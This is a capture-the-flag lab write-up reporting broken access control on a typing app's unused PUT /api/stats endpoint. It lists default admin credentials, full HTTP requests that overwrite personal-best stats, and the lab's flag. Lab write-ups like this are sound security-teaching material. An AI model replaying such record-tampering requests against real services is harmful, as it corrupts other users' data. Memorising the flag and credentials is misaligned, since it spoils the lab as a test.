# Bug Report: Broken Access Control on PUT /api/stats Allows Arbitrary Stats Manipulation

**Lab:** sokudo-001  
**Severity:** Medium  
**Flag:** `bug{1R6W7ea51W1opfTpPncFoEdyTJmDbuGz}`

---

## Summary

The Sokudo application exposes a `PUT /api/stats` endpoint that is not used by the frontend but is fully functional on the backend. This endpoint accepts the complete stats object and updates it without verifying ownership of the record. Any authenticated user can overwrite any user's stats by supplying a different `id` in the request body, including the admin's personal bests. The flag is returned in the response when the `wpm` field is set to 1000.

---

## Steps to Reproduce

1. Log in as the admin user (default credentials: `admin` / `admin123`) and obtain a JWT.

2. Send a GET request to retrieve the current stats object:

```
GET /api/stats HTTP/2
Host: lab-1782081143118-dgjb1i.labs-app.bugforge.io
Authorization: Bearer <admin_jwt>
```

Response:

```json
{
  "id": 6,
  "user_id": 1,
  "total_sessions": 1,
  "best_wpm": 196.17622610141314,
  "avg_wpm": 196.17622610141314,
  "total_chars_typed": 59,
  "total_time_seconds": 3.609,
  "personal_bests": [
    {
      "id": 2,
      "user_id": 1,
      "duration": 15,
      "char_type": "mixed",
      "wpm": 196.17622610141314,
      "accuracy": 5.084745762711865,
      "session_date": "2026-06-21 22:41:55"
    }
  ]
}
```

3. Send the same body back via PUT with `wpm` changed to 1000:

```
PUT /api/stats HTTP/2
Host: lab-1782081143118-dgjb1i.labs-app.bugforge.io
Authorization: Bearer <admin_jwt>
Content-Type: application/json

{
  "id": 6,
  "user_id": 1,
  "total_sessions": 1,
  "best_wpm": 196.17622610141314,
  "avg_wpm": 196.17622610141314,
  "total_chars_typed": 59,
  "total_time_seconds": 3.609,
  "personal_bests": [
    {
      "id": 2,
      "user_id": 1,
      "duration": 15,
      "char_type": "mixed",
      "wpm": 1000,
      "accuracy": 5.084745762711865,
      "session_date": "2026-06-21 22:41:55"
    }
  ]
}
```

4. The server responds with the flag:

```json
{
  "message": "Stats updated successfully",
  "flag": "bug{1R6W7ea51W1opfTpPncFoEdyTJmDbuGz}"
}
```

---

## Root Cause

The Express router registers a `PUT /api/stats` handler that is never called by the frontend application. The frontend only issues `GET /api/stats` requests. The PUT handler accepts a full stats object including nested `personal_bests` records and writes them to the database. There is no ownership check on the `id` or `user_id` fields in the request body, so any authenticated user can overwrite any stats record by supplying a different `id`.

---

## Impact

An authenticated attacker can overwrite any user's typing stats and personal bests without restriction. The missing ownership check also means a low-privileged user can modify admin-owned records by supplying the admin's stats `id` in the request body.
